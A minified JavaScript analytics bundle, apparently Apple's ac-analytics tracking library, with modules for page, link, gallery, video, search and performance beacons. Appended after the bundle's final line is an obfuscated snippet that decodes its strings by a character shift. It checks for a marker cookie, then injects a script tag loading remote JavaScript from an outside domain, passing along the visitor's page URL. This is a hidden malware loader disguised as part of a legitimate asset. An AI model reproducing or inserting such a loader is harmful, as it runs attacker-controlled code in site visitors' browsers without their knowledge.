initialize(){registry.addEntry("page",moduleName,100,track)},track:track}},{"../ErrorHandler":356,"../constants":359,"./TrackerRegistry":398,"@apple/analytics-data-layer":46}],401:[function(require,module,exports){const registry=require("./TrackerRegistry"),get=require("@apple/analytics-data-layer").get,remove=require("@apple/analytics-data-layer").remove,deferredPath=require("../constants").dataLayer.paths.deferred,setProperty=require("../helpers/setProperty");function track(trackingData){const deferredData=function _getDeferredData(){let deferredBeacon=get(deferredPath);remove(deferredPath),deferredBeacon||(deferredBeacon={});return delete deferredBeacon.eVar15,deferredBeacon}()||{};return Object.keys(deferredData).forEach((key=>{setProperty(trackingData.beacon,key,deferredData[key])})),!trackingData.beacon.prop57&&deferredData.hier1&&setProperty(trackingData.beacon,"prop57",deferredData.hier1),trackingData}module.exports={initialize:function initialize(){registry.addEntry("page","deferredToPageLoad",50,track)},track:track}},{"../constants":359,"../helpers/setProperty":382,"./TrackerRegistry":398,"@apple/analytics-data-layer":46}],402:[function(require,module,exports){const registry=require("./TrackerRegistry");function track(trackingData){return trackingData.beacon.title="element engagement",trackingData.beacon.events="event316",trackingData.beacon.prop3=trackingData.data.engagementTitle,trackingData.beacon.eVar30=trackingData.options?.target?.dataset?.analyticsRegion||"missing region",trackingData}module.exports={track:track,initialize:function initialize(){registry.addEntry("elementEngagement","elementEngagementTracker",50,track)}}},{"./TrackerRegistry":398}],403:[function(require,module,exports){const registry=require("./TrackerRegistry");function track(trackingData){return trackingData.beacon={title:"end of page",events:trackingData.data.events},trackingData}module.exports={initialize:function initialize(){registry.addEntry("endOfPage","endOfPageTracker",50,track)},track:track}},{"./TrackerRegistry":398}],404:[function(require,module,exports){const registry=require("./TrackerRegistry");function track(trackingData){for(const key in trackingData.data)trackingData.beacon[key]=trackingData.data[key];return trackingData}module.exports={track:track,initialize:function initialize(){registry.addEntry("custom","customTracker",50,track)}}},{"./TrackerRegistry":398}],405:[function(require,module,exports){const registry=require("./TrackerRegistry"),ancestor=require("@marcom/dom-traversal/ancestor"),get=require("@apple/analytics-data-layer").get,formatter=require("../helpers/formatter"),separator=require("../helpers/separator"),dataLayerConfig=require("../constants").dataLayer.configuration,interactionTypes={click:function(trackingData){return function _triggerNavType(trackingData){let type=!1;const trigger=_getTargetElement(trackingData);trigger&&(type=function _getNavType(trigger){let containerClassName,i,type=null;const interactionTypeClasses=["dotnav","thumbnav","paddlenav","tabnav"],interactionTypeAttribute="data-analytics-gallery-interaction-type",triggerContainer=ancestor(trigger,".dotnav, .thumbnav, .paddlenav, .tabnav, ["+interactionTypeAttribute+"]");if(triggerContainer)if(triggerContainer.hasAttribute(interactionTypeAttribute))type=triggerContainer.getAttribute(interactionTypeAttribute);else for(containerClassName=triggerContainer.className,i=0;i<interactionTypeClasses.length;i++)if(-1!==containerClassName.indexOf(interactionTypeClasses[i])){type=interactionTypeClasses[i];break}return type}(trigger));return type}(trackingData)||"click"},auto:function(){return"auto"},keydown:function(){return"keydown"},touchend:function(){return"swipe"},touchstart:function(){return"swipe"},touchmove:function(){return"swipe"}},interactionTypeMap={click:"ci",keydown:"ki",swipe:"si",dotnav:"bi",thumbnav:"ci",tabnav:"ci",paddlenav:"pi",auto:"ai"};function track(trackingData){const interactionEventType=function _interactionEventType(trackingData){const data=trackingData.data;let type="auto";data.interactionEvent&&data.interactionEvent.type&&(type=data.interactionEvent.type);return type}(trackingData);let outgoingInteractionType,incomingInteractionType,interactionType=interactionEventType;interactionTypes[interactionEventType]&&(interactionType=interactionTypes[interactionEventType](trackingData)),trackingData.data.targetEl=_getTargetElement(trackingData),trackingData.data.slideInViewTime=function _slideInViewTime(trackingData){return trackingData.data.incomingSlideTimestamp-trackingData.data.outgoingSlideTimestamp}(trackingData),trackingData.data.outgoingInteractionType=trackingData.observer.outgoingSlideInteractionType,trackingData.data.incomingInteractionType=interactionType,trackingData.data.galleryFirstTimeTrigger=function _isFirstTimeGalleryTrigger(trackingData){const incomingInteractionType=trackingData.data.incomingInteractionType,observer=trackingData.observer;let firstTimeGalleryTrigger=!1;"auto"!==incomingInteractionType&&-1===observer.trackedInteractionTypes.indexOf(incomingInteractionType)&&(firstTimeGalleryTrigger=!0,observer.trackedInteractionTypes.push(incomingInteractionType));return firstTimeGalleryTrigger}(trackingData),trackingData.observer.outgoingSlideInteractionType=interactionType,interactionTypeMap[trackingData.data.incomingInteractionType]&&(incomingInteractionType=interactionTypeMap[trackingData.data.incomingInteractionType]),void 0===incomingInteractionType&&(incomingInteractionType="ci"),interactionTypeMap[trackingData.data.outgoingInteractionType]&&(outgoingInteractionType=interactionTypeMap[trackingData.data.outgoingInteractionType]),void 0===outgoingInteractionType&&(outgoingInteractionType="ci");const propString=get([dataLayerConfig.key,dataLayerConfig.keys.pageName])+separator.hyphen+trackingData.options.galleryName+separator.hyphen;return trackingData.beacon.prop2=formatter.eventString(outgoingInteractionType,"")+propString+trackingData.data.outgoing.id,trackingData.beacon.prop3=trackingData.beacon.title=formatter.eventString(incomingInteractionType,"")+propString+trackingData.data.incoming.id,!0===trackingData.data.galleryFirstTimeTrigger&&(trackingData.beacon.prop16="gallery interaction",trackingData.beacon.eVar16=(trackingData.options.galleryName?trackingData.options.galleryName+" ":"")+"gallery interaction",trackingData.beacon.events="event1"),trackingData}function _getTargetElement(trackingData){const interactionEvent=trackingData.data.interactionEvent;let element=!1;return interactionEvent&&(element=interactionEvent.target||interactionEvent.srcElement),element}module.exports={track:track,initialize:function initialize(){registry.addEntry("gallery","galleryTracker",50,track)}}},{"../constants":359,"../helpers/formatter":368,"../helpers/separator":380,"./TrackerRegistry":398,"@apple/analytics-data-layer":46,"@marcom/dom-traversal/ancestor":293}],406:[function(require,module,exports){const registry=require("./TrackerRegistry"),regions=require("./regions/regions"),separator=require("../helpers/separator"),formatter=require("../helpers/formatter"),dataLayerConfig=require("../constants").dataLayer.configuration,get=require("@apple/analytics-data-layer").get;function track(trackingData){const targetElParentRegion=regions.getRegionByElement(trackingData.data.targetEl),linkTitle=trackingData.data.targetEl.getAttribute("data-"+trackingData.options.titleDataAttribute);return linkTitle?trackingData.data.linkText=linkTitle:trackingData.data.targetEl.textContent?trackingData.data.linkText=trackingData.data.targetEl.textContent.trim():trackingData.data.targetEl.innerText?trackingData.data.linkText=trackingData.data.targetEl.innerText.trim():trackingData.data.linkText="no title available",trackingData.data.regionAncestry=regions.getRegionAncestryByElement(trackingData.data.targetEl),trackingData.data.targetEl.id&&(trackingData.data.linkId=trackingData.data.targetEl.id),"object"==typeof targetElParentRegion&&(trackingData.data.region=targetElParentRegion.name),function setNavigationSrc(trackingData){const data=trackingData.data,epubBeacon={},linkTrackingBeacon={},regionAncestry=formatter.getRegionAncestry(data),pageName=get([dataLayerConfig.key,dataLayerConfig.keys.computedPageName])||"",linkText=data.linkText||"";linkTrackingBeacon.eVar1=epubBeacon.eVar1=pageName+separator.pipe+regionAncestry+linkText,linkTrackingBeacon.prop57=epubBeacon.prop57=get([dataLayerConfig.key,dataLayerConfig.keys.computedChannel])||"",trackingData.beacon=linkTrackingBeacon}(trackingData),trackingData}module.exports={track:track,initialize:function initialize(){registry.addEntry("link","linkTracker",50,track)}}},{"../constants":359,"../helpers/formatter":368,"../helpers/separator":380,"./TrackerRegistry":398,"./regions/regions":412,"@apple/analytics-data-layer":46}],407:[function(require,module,exports){const registry=require("./TrackerRegistry"),pageHide=require("./pageHide");function track(trackingData){return pageHide.track(trackingData)}module.exports={track:track,initialize:function initialize(){registry.addEntry("navigationalLink","navigationalLinkTracker",50,track)}}},{"./TrackerRegistry":398,"./pageHide":408}],408:[function(require,module,exports){const registry=require("./TrackerRegistry"),getPassiveTrackerData=require("../helpers/getPassiveTrackerData"),filterBeaconsByType=require("../helpers/filterBeaconsByType"),mergePassiveTrackerData=require("../helpers/mergePassiveTrackerData"),remove=require("@apple/analytics-data-layer").remove,passiveTrackerPath=require("../constants").dataLayer.paths.passiveTracker,{merge:merge}=require("@apple/analytics-merge-beacons");function track(trackingData){let data=getPassiveTrackerData();return data?(data=filterBeaconsByType(data,"page"),data.length?(data=mergePassiveTrackerData(data),trackingData.beacon=merge({target:trackingData.beacon,source:data}),remove(passiveTrackerPath),trackingData):trackingData):trackingData}module.exports={initialize:function initialize(){registry.addEntry("pageHide","beforeUnload",50,track)},track:track}},{"../constants":359,"../helpers/filterBeaconsByType":367,"../helpers/getPassiveTrackerData":370,"../helpers/mergePassiveTrackerData":377,"./TrackerRegistry":398,"@apple/analytics-data-layer":46,"@apple/analytics-merge-beacons":94}],409:[function(require,module,exports){const registry=require("./TrackerRegistry"),get=require("@apple/analytics-data-layer").get,separator=require("../helpers/separator"),dataLayerKeys=require("../constants").dataLayer,confKey=dataLayerKeys.configuration.key,confKeys=dataLayerKeys.configuration.keys,setProperty=require("../helpers/setProperty");function track(trackingData){return setProperty(trackingData.beacon,"prop20",`AOS${separator.colon}{COUNTRY_CODE}`),setProperty(trackingData.beacon,"pageName",get([confKey,confKeys.computedPageName])),setProperty(trackingData.beacon,"channel",get([confKey,confKeys.computedChannel])),setProperty(trackingData.beacon,"eVar3",trackingData.beacon.prop20),window.ac_target?.ssdata&&setProperty(trackingData.beacon,"eVar57",window.ac_target.ssdata),trackingData}module.exports={initialize:function initialize(){registry.addEntry("page","pageLoad",1,track)},track:track}},{"../constants":359,"../helpers/separator":380,"../helpers/setProperty":382,"./TrackerRegistry":398,"@apple/analytics-data-layer":46}],410:[function(require,module,exports){const registry=require("./TrackerRegistry"),passiveTracker=require("../passiveTracker"),performanceTimingEvents=require("../constants").performanceTimingEvents,passiveTrackerOptions={trackOnPageLoad:!0,trackOnExitLink:!0};let hasTracked=!1;function track(trackingData){if(!(window&&window.performance&&window.performance.timing)||hasTracked)return;trackingData.options;const interval=setInterval((()=>{window.performance.timing.loadEventEnd&&(!function performanceWrite(performance){const pt=performance.timing,performanceDataArr=[];performanceDataArr.push(performanceCheck(pt.fetchStart,pt.navigationStart)),performanceDataArr.push(performanceCheck(pt.domainLookupStart,pt.fetchStart)),performanceDataArr.push(performanceCheck(pt.domainLookupEnd,pt.domainLookupStart)),performanceDataArr.push(performanceCheck(pt.connectEnd,pt.connectStart)),performanceDataArr.push(performanceCheck(pt.responseStart,pt.connectEnd)),performanceDataArr.push(performanceCheck(pt.responseEnd,pt.responseStart)),performanceDataArr.push(performanceCheck(pt.domInteractive,pt.domLoading)),performanceDataArr.push(performanceCheck(pt.domContentLoadedEventEnd,pt.domInteractive)),performanceDataArr.push(performanceCheck(pt.domComplete,pt.domContentLoadedEventEnd)),performanceDataArr.push(performanceCheck(pt.loadEventStart,pt.domLoading)),performanceDataArr.push(performanceCheck(pt.loadEventEnd,pt.loadEventStart)),performanceDataArr.push(performanceCheck(pt.loadEventEnd,pt.navigationStart));const eventList=performanceTimingEvents.split(",");let eventsStr="";eventList.forEach(((event,index)=>{void 0!==performanceDataArr[index]?eventsStr+=`${event}=${performanceDataArr[index]},`:eventsStr+=`${event},`})),eventsStr=eventsStr.substring(0,eventsStr.length-1);passiveTracker({events:eventsStr},passiveTrackerOptions)}(window.performance),function trackFirstContentfulPaint(performance){const firstContentfulPaint=performance.getEntriesByName("first-contentful-paint");if(!(firstContentfulPaint&&firstContentfulPaint.length&&firstContentfulPaint[0].startTime&&firstContentfulPaint[0].startTime.toFixed(2)))return;const data={events:`event419=${(firstContentfulPaint[0].startTime/1e3).toFixed(3)},event420`};passiveTracker(data,passiveTrackerOptions)}(window.performance),hasTracked=!0,clearInterval(interval))}),200)}function performanceCheck(a,b){return a-b<6e4&&a-b>=0?((a-b)/1e3).toFixed(3):600}module.exports={track:track,initialize:function initialize(){registry.addEntry("readyStateComplete","performanceTracker",50,track)},trackFirstMeaningfulPaint:function trackFirstMeaningfulPaint(time){if(time)time=parseFloat(time);else{if(!window||!window.performance||!window.performance)return;time=window.performance.now()}if("number"!=typeof time)return;const data={events:`event421=${(time/1e3).toFixed(3)},event422`};passiveTracker(data,passiveTrackerOptions)}}},{"../constants":359,"../passiveTracker":397,"./TrackerRegistry":398}],411:[function(require,module,exports){const validJSONPattern=/(?:\w+:\w+)(?:,(?=(?:\w+:\w+))|$)/,singleValuePattern=/[\w\s]+/,dataStringToObject=require("../../helpers/dataStringToObject");module.exports={Region:class Region{constructor(regionElement){this.element=regionElement,this.childRegions={},this.parentRegion="",this.options=this.getDataOptions(),this.name=this.setName()}setName(){let value="";return this.options.name&&(value=this.options.name),!this.options.name&&this.element.id&&(this.options.name=this.element.id),value}getDataOptions(){let data={},value=this.element.getAttribute("data-analytics-region"),options=this.element.getAttribute("data-analytics-options");value=this._removeTrailingCommas(value),options=this._removeTrailingCommas(options),this._isJSONable(value)?data=dataStringToObject(value):this._isSingleValue(value)&&(data.name=value),options&&this._isJSONable(options)&&(data=Object.assign({},data,dataStringToObject(options)));for(const key in data)data.hasOwnProperty(key)&&("false"===data[key]?data[key]=!1:"true"===data[key]&&(data[key]=!0));return data}_isJSONable(value){return validJSONPattern.test(value)}_isSingleValue(value){return singleValuePattern.test(value)}_removeTrailingCommas(str){if(str&&"string"==typeof str)return","===str.charAt(str.length-1)?str.substr(0,str.length-1):str}},dataAttribute:"analytics-region"}},{"../../helpers/dataStringToObject":364}],412:[function(require,module,exports){const domNodes=require("@marcom/ac-dom-nodes"),Region=require("./Region").Region,dataAttribute=require("./Region").dataAttribute;let allRegions=[];const tree={};function getAllRegions(){if(allRegions.length>0)return allRegions;const allRegionsElements=document.querySelectorAll("[data-"+dataAttribute+"]");let topLevelRegion;const regionsLen=allRegionsElements.length;let i=0;function _getChildRegions(regionObj){let childRegion;for(;domNodes.isNodeType(allRegionsElements[i+1],domNodes.NODE_TYPES.ELEMENT)&&regionObj.element.contains(allRegionsElements[i+1]);)childRegion=new Region(allRegionsElements[i+1]),allRegions.push(childRegion),childRegion.parentRegion=regionObj.name,regionObj.childRegions[childRegion.name]=childRegion,i+=1,_getChildRegions(childRegion)}for(;i<regionsLen;i+=1)topLevelRegion=new Region(allRegionsElements[i]),tree[topLevelRegion.name]=topLevelRegion,allRegions.push(topLevelRegion),_getChildRegions(topLevelRegion);return allRegions}function getRegionByElement(element){if(domNodes.isNodeType(element,domNodes.NODE_TYPES.ELEMENT)){const allAncestorRegions=getRegionAncestryByElement(element);let region;if(allAncestorRegions.length>0)return region=allAncestorRegions.pop(),region}}function getRegionAncestryByElement(element){const parsedRegions=getAllRegions();if(domNodes.isNodeType(element,domNodes.NODE_TYPES.ELEMENT))return parsedRegions.filter((function(region){if(region.element.contains(element))return _refreshDynamicRegion(region),!0}))}function _refreshDynamicRegion(region){region.options&&region.options.dynamic&&refreshRegion(region)}function refreshRegion(region){let regionObj=region;domNodes.isNodeType(region,domNodes.NODE_TYPES.ELEMENT)&&(regionObj=getRegionByElement(region)),"object"==typeof regionObj&&allRegions.forEach((function(r){r.element===regionObj.element&&(r.options=r.getDataOptions(),r.name=r.setName())}))}module.exports={getTree:function getTree(){if(getAllRegions(),Object.keys(tree).length>0)return tree},getAllRegions:getAllRegions,getRegionByElement:getRegionByElement,getRegionByName:function getRegionByName(name){const parsedRegions=getAllRegions();if("string"==typeof name)return parsedRegions.filter((function(region){return _refreshDynamicRegion(region),region.name===name}))},getRegionAncestryByElement:getRegionAncestryByElement,refreshRegion:refreshRegion,clearRegions:function clearRegions(){allRegions=[]}}},{"./Region":411,"@marcom/ac-dom-nodes":260}],413:[function(require,module,exports){const getBeginBeacon=require("@apple/analytics-search").begin,merge=require("@apple/analytics-merge-beacons").merge,registry=require("../TrackerRegistry"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../constants").dataLayer.configuration,pageTypeKey=[dataLayerConfig.key,dataLayerConfig.keys.pageType],config={action:{OPEN:"open",CLOSE:"close",ENGAGE:"engage"},errorPage:{pageType:"errorPage",id:"searchform-input"},trackEvents:["linkClick","focusin"],globalNav:".ac-gn-link-search, #globalnav-menubutton-link-search"};function track(data){const searchObj=function getSearchObj(data){if(!(data&&data.type&&data.event&&data.event.dynamicEventBinderTarget))return null;const isTrackedEvent=config.trackEvents.includes(data.type);if(!isTrackedEvent)return null;const el=data.event.dynamicEventBinderTarget;if(get(pageTypeKey)===config.errorPage.pageType&&el.id===config.errorPage.id)return{action:config.action.ENGAGE};if(el.matches(config.globalNav)){return{action:Boolean(el.dataset.analyticsTitle)?config.action.OPEN:config.action.CLOSE}}return null}(data);return searchObj?(merge({target:data.beacon,source:getBeginBeacon(searchObj)}),data.beacon.title=data.beacon.prop3,data):null}module.exports={track:track,initialize:function initialize(){registry.addEntry("linkClick","beginSearchTrackerLinkClick",50,track),registry.addEntry("focusin","beginSearchTrackerFocusIn",50,track)}}},{"../../constants":359,"../TrackerRegistry":398,"@apple/analytics-data-layer":46,"@apple/analytics-merge-beacons":94,"@apple/analytics-search":144}],414:[function(require,module,exports){const getPerformBeacon=require("@apple/analytics-search").perform,merge=require("@apple/analytics-merge-beacons").merge,registry=require("../TrackerRegistry"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../constants").dataLayer.configuration,pageTypeKey=[dataLayerConfig.key,dataLayerConfig.keys.pageType],config={errorPage:{pageType:"errorPage",id:"searchform-form"},searchPage:{pageType:"search"},trackEvents:["submit","linkClick"],globalNav:"#ac-gn-searchform, .globalnav-searchfield",globalNavLink:".ac-gn-searchresults-link, .globalnav-searchresults-list-link",searchSource:{ERROR:"error",SEARCH:"search",MARCOM:"www"},searchMethod:{TYPED:"typed",DEFAULT:"default"},keywordSelectors:{globalNav:"#ac-gn-searchform-input, .globalnav-searchfield-input",errorPage:"#searchform-input"}};function track(data){const searchObj=function getSearchObj({type:type,event:event}){if(!event||!config.trackEvents.includes(type))return null;const el=event.dynamicEventBinderTarget;return[submitForm,clickLink].reduce(((acc,searchObjProcessor)=>acc||searchObjProcessor({el:el})),null)||null}(data);return searchObj?(data.options.deferred=!0,data.options.silent=!0,merge({target:data.beacon,source:getPerformBeacon(searchObj)}),data):null}function clickLink({el:el}){if(!el.matches(config.globalNavLink))return null;const method=getElementDataSet(el,"section");return{keyword:getElementDataSet(el,"query"),method:method,position:getElementDataSet(el,"index"),results:getElementDataSet(el,"items"),source:getSearchSource(el),suggestedValue:getElementDataSet(el,"label"),type:method}}function getElementDataSet(element,datasetName){return element.dataset[datasetName]||null}function getSearchSource(el){if(get(pageTypeKey)===config.errorPage.pageType)return config.searchSource.ERROR;return get(pageTypeKey)===config.searchPage.pageType?config.searchSource.SEARCH:config.searchSource.MARCOM}function getInputValue(el){if(get(pageTypeKey)===config.errorPage.pageType)return el.querySelector(config.keywordSelectors.errorPage)?.value||null;return el.matches(config.globalNav)&&el.querySelector(config.keywordSelectors.globalNav)?.value||null}function submitForm({el:el}){return el.matches(config.globalNav)||el.id===config.errorPage.id?{keyword:getInputValue(el),method:config.searchMethod.TYPED,source:getSearchSource()}:null}module.exports={track:track,initialize:function initialize(){registry.addEntry("linkClick","performSearchTrackerLinkClick",50,track),registry.addEntry("submit","performSearchTrackerFocusIn",50,track)}}},{"../../constants":359,"../TrackerRegistry":398,"@apple/analytics-data-layer":46,"@apple/analytics-merge-beacons":94,"@apple/analytics-search":144}],415:[function(require,module,exports){const registry=require("./TrackerRegistry");function track(trackingData){const trackedElement=trackingData.data.element,elementName=trackedElement.name||trackedElement.id||trackedElement.dataAttrValue||"",timeInThreshold=trackedElement.thresholdExitTime-trackedElement.thresholdEnterTime;if(trackingData.beacon.title="section engagement",trackingData.beacon.prop34=elementName,trackingData.beacon.prop35=(timeInThreshold/1e3).toFixed(2),trackingData.beacon.prop36=trackedElement.element.position,trackingData.beacon.prop35){const event243WithValue="event243="+trackingData.beacon.prop35;trackingData.beacon.events=event243WithValue+",event244"}return trackingData}module.exports={initialize:function initialize(){registry.addEntry("section","sectionEngagement",50,track)},track:track}},{"./TrackerRegistry":398}],416:[function(require,module,exports){const registry=require("./TrackerRegistry"),dataLayerConfig=require("../constants").dataLayer.configuration,get=require("@apple/analytics-data-layer").get,{merge:merge,set:set}=require("@apple/analytics-passive-tracker");function track(trackingData){const pageName=get([dataLayerConfig.key,dataLayerConfig.keys.computedPageName]),epubBeacon={};trackingData.beacon.prop57=epubBeacon.prop57=get([dataLayerConfig.key,dataLayerConfig.keys.computedChannel])||"",set("pageName",pageName,{type:"page"}),merge("beacon",epubBeacon,{type:"page"})}module.exports={track:track,initialize:function initialize(){registry.addEntry("storeAtPageLoad","storeForNextPageTracker",50,track)}}},{"../constants":359,"./TrackerRegistry":398,"@apple/analytics-data-layer":46,"@apple/analytics-passive-tracker":126}],417:[function(require,module,exports){const registry=require("./TrackerRegistry"),get=require("@apple/analytics-data-layer").get,formatter=require("../helpers/formatter"),separator=require("../helpers/separator"),dataLayerConfig=require("../constants").dataLayer.configuration,eventTypes={play:function(){return"started"},ended:function(){return"ended"},texttrackshow:function(trackingData){return 0===trackingData.data.ttShowCount?"texttrackshow":"texttrackshown"},milestone:function(trackingData){return trackingData.data.seeked?"seeked":"milestone"}},interactionTypes={click:function(trackingData){return trackingData.data.event.type}},milestoneEvents={0:{play:null,seek:"event214"},.1:{play:"event73",seek:"event215"},.25:{play:"event74",seek:"event216"},.5:{play:"event75",seek:"event217"},.75:{play:"event76",seek:"event218"},.9:{play:"event77",seek:"event219"}},eventTypeMap={started:"s",ended:"e",texttrackshow:"ce",seeked:"sk",milestone:"m"};function track(trackingData){const data=trackingData.data;data.eventType=eventTypes[data.eventType]?eventTypes[data.eventType](trackingData):data.eventType,data.event&&interactionTypes[data.event.type]&&(data.interactionType=interactionTypes[data.event.type](trackingData)),isNaN(data.duration)?data.duration="unavailable":data.duration=Math.round(data.duration).toString(),isNaN(data.currentTime)?data.currentTime="unavailable":data.currentTime=Math.round(data.currentTime).toString(),eventTypeMap[data.eventType]?trackingData.options.silent=!1:trackingData.options.silent=!0;const videoName=get([dataLayerConfig.key,dataLayerConfig.keys.pageName])+separator.hyphen+data.videoId,title=function _setTitle(data,videoName,eventType){let title=formatter.eventString("v",eventType),milestoneNumber=null;data.hasOwnProperty("milestone")&&!isNaN(data.milestone)&&(milestoneNumber=100*data.milestone);null!==milestoneNumber&&(title+=milestoneNumber);return title+=": "+videoName,title}(data,videoName,data.eventType&&eventTypeMap[data.eventType]?eventTypeMap[data.eventType]:data.eventType),beacon={};return beacon.title=beacon.prop13=title,beacon.eVar87=videoName,void 0!==data.duration&&trackingData.options.trackDuration&&(beacon.eVar91=data.duration,_setEvents(beacon,"event233="+data.duration)),void 0!==data.currentTime&&"ended"!==data.eventType&&trackingData.options.trackCurrentTime&&(beacon.eVar92=data.currentTime,_setEvents(beacon,"event69="+data.currentTime)),data.src&&(beacon.eVar95=data.src),"started"===data.eventType&&(beacon.prop16=beacon.eVar16="video plays",_setEvents(beacon,"event2")),"ended"===data.eventType&&(beacon.prop16=beacon.eVar16="video ends",_setEvents(beacon,"event72"),void 0!==data.duration&&trackingData.options.trackCurrentTime&&(beacon.eVar92=data.duration,_setEvents(beacon,"event69="+data.duration))),"texttrackshow"===data.eventType&&(beacon.title=beacon.prop2=videoName+separator.hyphen+"cc",beacon.prop13=""),"milestone"!==data.eventType&&"seeked"!==data.eventType||(!function _setMilestoneEventValues(events,data,beacon){let event;event=data.seeked?events[data.milestone].seek:events[data.milestone].play;_setEvents(beacon,event)}(milestoneEvents,data,beacon),beacon.prop13=""),"milestone"===data.eventType&&(beacon.prop16=beacon.eVar16="video milestone"),"seeked"===data.eventType&&(beacon.eVar96=""+100*data.milestone,beacon.prop16=beacon.eVar16="video seek"),data.videoType&&data.playerType&&(beacon.prop18=data.videoType+" via "+data.playerType),trackingData.beacon=beacon,trackingData}function _setEvents(beacon,event){beacon.events?beacon.events+=","+event:beacon.events=event}module.exports={track:track,initialize:function initialize(){registry.addEntry("video","videoTracker",50,track)}}},{"../constants":359,"../helpers/formatter":368,"../helpers/separator":380,"./TrackerRegistry":398,"@apple/analytics-data-layer":46}],"@marcom/ac-analytics":[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,dataLayer=require("./ac-analytics/constants").dataLayer,configuration=dataLayer.configuration,meta=dataLayer.meta;module.exports={createBasicObserverSuite:require("./ac-analytics/initialize"),initialize:require("./ac-analytics/initialize"),observer:{Click:require("./ac-analytics/observers/Click"),Event:require("./ac-analytics/observers/Event"),Gallery:require("./ac-analytics/observers/Gallery"),Link:require("./ac-analytics/observers/Link"),Page:require("./ac-analytics/observers/Page"),Section:require("./ac-analytics/observers/Section"),Video:require("./ac-analytics/observers/Video"),Registry:require("./ac-analytics/observers/observerRegistry")},track:require("./ac-analytics/Tracker").trackGeneric,passiveTracker:require("./ac-analytics/passiveTracker"),regions:require("./ac-analytics/trackers/regions/regions"),reset:require("./ac-analytics/destroy"),destroy:require("./ac-analytics/destroy"),resetActivityMap:require("./ac-analytics/Appmeasurement/appMeasurementPlugins/activitymap/ActivityMapCollection").createActivityMapCollection,addActivityMapItem:require("./ac-analytics/Appmeasurement/appMeasurementPlugins/activitymap/ActivityMapCollection").addElToCollection,errorHandler:require("./ac-analytics/ErrorHandler"),trackFirstMeaningfulPaint:require("./ac-analytics/trackers/performance").trackFirstMeaningfulPaint,dataLayer:{get:get,set:set,configuration:{key:configuration.key,keys:configuration.keys,get:()=>get(configuration.key)},meta:{key:meta.key,keys:meta.keys,get:()=>get(meta.key)}}}},{"./ac-analytics/Appmeasurement/appMeasurementPlugins/activitymap/ActivityMapCollection":312,"./ac-analytics/ErrorHandler":356,"./ac-analytics/Tracker":358,"./ac-analytics/constants":359,"./ac-analytics/destroy":360,"./ac-analytics/initialize":386,"./ac-analytics/observers/Click":388,"./ac-analytics/observers/Event":390,"./ac-analytics/observers/Gallery":391,"./ac-analytics/observers/Link":392,"./ac-analytics/observers/Page":393,"./ac-analytics/observers/Section":394,"./ac-analytics/observers/Video":395,"./ac-analytics/observers/observerRegistry":396,"./ac-analytics/passiveTracker":397,"./ac-analytics/trackers/performance":410,"./ac-analytics/trackers/regions/regions":412,"@apple/analytics-data-layer":46}]},{},[]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));